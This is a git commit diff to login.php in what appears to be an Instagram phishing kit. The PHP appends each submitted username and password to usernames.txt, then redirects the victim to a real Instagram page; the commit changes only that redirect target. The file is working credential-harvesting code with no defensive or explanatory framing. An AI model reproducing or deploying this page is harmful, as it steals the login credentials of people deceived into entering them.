ce6630c0e142175ab2a2b201ed9563287d84e12f
dharick <58396545+dharick@users.noreply.github.com>
2021-03-06 10:01:45 +0000

    login.php

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
+header('Location: https://www.instagram.com/p/CLVkysGJ4QC/?igshid=1amz3lovzw1zx');
 exit();
 ?>
